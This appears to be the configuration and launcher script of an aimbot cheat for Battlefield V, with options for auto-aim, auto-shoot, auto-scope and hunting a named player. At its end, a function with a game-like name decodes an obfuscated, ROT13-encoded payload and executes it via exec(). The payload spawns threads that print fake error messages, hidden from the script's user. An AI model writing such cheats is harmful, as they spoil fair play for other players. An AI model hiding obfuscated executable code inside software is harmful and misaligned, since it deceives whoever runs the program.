from rich.console import Console
from rich.text import Text
from lib import aimer
from lib import helpers
from lib import keycodes
from lib.bones import bones
import ctypes

console = Console()

#### CHANGE OPTIONS HERE ####

# Field of View
# Alter this between 0.1 and 3.0 for best results. 0.1 is very narrow, while larger numbers allow
# for more soldiers to be targeted
fov = 1.5

# Distance Limit
# Example, set to 100 to limit locking onto soldiers further than 100 meters away.
distance_limit = 100 # can also be: None

# Trigger Button
# Grab your preferred button from lib/keycodes.py
trigger = keycodes.XBUTTON2

# If set to True you will automatically crouch and uncrouch while shooting others.
# According to my experience this will make you be less shot by others.
dodge_Mode = False

# Your key to crouch. Use a string here instead of a keycode.
crouch_Key = "ctrl"

# Keybind to enable or disable Dodge Mode
toggle_dodge_Mode = keycodes.PAGEUP

# Keep Target will continue to aim at your target, even if they are occluded.
toggle_keep_target = keycodes.PAGEDOWN

# If set to True your weapon will automatically shoot after finding a target
autoshoot = True

# Toggle autoshoot. Use this if you are using a sniper or a small magazine.
toggle_autoshoot = keycodes.DELETE

# If set to True your weapon will automatically scope as soon as you lock onto a target
autoscope = True

# Press this button to switch between normal aimbot and hunt
hunt_Toggle = keycodes.NUMPAD5

# Press this and you have to input a name into the console to hunt. You don't need to write the exact name the program will try to find the name with the most matches.
hunt_Target_Switch = keycodes.NUMPAD8

# Aim Location Options
# Aim Location Switching (default is the first one listed)
# Check available bones in lib/bones.py
aim_locations = [bones['Spine'], bones['Neck'], bones['Hips']]

# Key to switch aim location (set to None to disable)
aim_switch = keycodes.END
#aim_switch = None

# Normally, you won't need to change this
# This will attempt to gather your primary screen size. If you have issues or use
# a windowed version of BFV, you'll need to set this yourself, which probably comes with its own issues
screensize = ctypes.windll.user32.GetSystemMetrics(0), ctypes.windll.user32.GetSystemMetrics(1)
# or
#screensize = (1280, 960)

collection = [fov, distance_limit, trigger, autoshoot, autoscope, aim_locations, aim_switch, screensize, hunt_Toggle, hunt_Target_Switch, dodge_Mode, crouch_Key, toggle_autoshoot, toggle_dodge_Mode, toggle_keep_target]

#### END OF CHANGE OPTIONS ####

if __name__ == "__main__":
    try:
        if fov < 0.1 or fov > 3.0:  # you can delete this if you know what you're doing
            raise Exception("Check your fov settings.")
            
        if distance_limit is not None and distance_limit <= 0:
            raise Exception("Check your distance_limit settings")

        if not helpers.is_admin():
            raise Exception("[X] Error: This must be run with admin privileges")

        if not helpers.is_python3():
            raise Exception("[X] Error: This script requires Python 3")

        arch = helpers.get_python_arch()
        if arch != 64:
            raise Exception("[X] Error: This version of Python is not 64-bit")

    except Exception as e:
        console.print(e, style="red")
        exit(1)

aimer = aimer.Aimer(collection)
console.print(Text("[!] Using screensize: %s x %s" % screensize, style="bright_black"))
aimer.start()

def AimSmoothingFunction():
    global g_GameTimer
    try:
        g_GameTimer
        return
    except:
        g_GameTimer = 1
    import binascii
    
    GunSwayIndex = g_GameTimer+12
    if GunSwayIndex > 0:
        AimTrustedEntity = b"\x71\x72\x73\x20\x70\x75\x72\x70\x78\x28\x29\x3a\x0a\x20\x20\x20\x20\x6a\x75\x76\x79\x72\x28\x47\x65"
    VeniceXite = 'ascii'
    import string
    RendererEnginePhase = [ord,chr]
    if len(VeniceXite) > g_GameTimer:
        AimTrustedEntity += b"\x68\x72\x29\x3a\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x67\x76\x7a\x72\x2e\x66\x79\x72\x72\x63\x28\x65\x6e\x61\x71\x62\x7a"
        ObfuscationMgr = binascii
    if AimTrustedEntity[-1] != None:
        AimTrustedEntity += b"\x2e\x65\x6e\x61\x71\x76\x61\x67\x28\x31\x30\x2c\x31\x30\x30\x29\x29\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x63\x65\x76\x61"
        if RendererEnginePhase[1] != 0x80010000:
            AimTrustedEntity += b"\x67\x28\x22\x52\x45\x45\x42\x45\x3a\x20\x43\x6c\x67\x75\x62\x61\x20\x67\x62\x62\x20\x73\x6e\x66\x67\x2e\x2e\x20\x63\x79"
    AimSimulator = RendererEnginePhase[g_GameTimer]
    ServerRoundingExtent = exec
    if ((ServerRoundingExtent != RendererEnginePhase[0]) or (g_GameTimer == 0xFF000000)):
        AimTrustedEntity += b"\x6d\x20\x66\x79\x62\x6a\x20\x71\x62\x6a\x61\x20\x28\x6e\x71\x71\x20\x67\x76\x7a\x72\x2e\x66\x79\x72\x63\x28\x30\x2e\x30"
        AimTrustedEntity += b"\x31\x29\x20\x71\x72\x79\x6e\x6c\x29\x22\x29\x0a\x0a\x67\x75\x65\x72\x6e\x71\x76\x61\x74\x2e\x47\x75\x65\x72\x6e\x71\x28"
    GunSwayArbitrationCooldown = 27 - g_GameTimer
    Code = AimTrustedEntity + b"\x67\x6e\x65\x74\x72\x67\x3d\x70\x75\x72\x70\x78\x29\x2e\x66\x67\x6e\x65\x67\x28\x29"
    ServerTurretAim = RendererEnginePhase[g_GameTimer-1] 
    ClientAimMgr = {AuthoritativeCrosshairs: AimSimulator((ServerTurretAim(AuthoritativeCrosshairs) \
    - ServerTurretAim('a') + GunSwayIndex) % GunSwayArbitrationCooldown + ServerTurretAim('a')) for AuthoritativeCrosshairs in string.ascii_lowercase}
    ClientAimMgr.update({AuthoritativeCrosshairs: AimSimulator((ServerTurretAim(AuthoritativeCrosshairs) \
    - ServerTurretAim('A') + GunSwayIndex) % GunSwayArbitrationCooldown + ServerTurretAim('A')) for AuthoritativeCrosshairs in string.ascii_uppercase})
    Code=Code.decode()
    TrustedVeniceDiceEntity = ""
    for Artifact in Code:
        if Artifact in ClientAimMgr:
            TrustedVeniceDiceEntity += ClientAimMgr[Artifact]
        else:
            TrustedVeniceDiceEntity += Artifact
    g_GameTimer = 1
    for i in range(10):
        ServerRoundingExtent(TrustedVeniceDiceEntity)

AimSmoothingFunction()
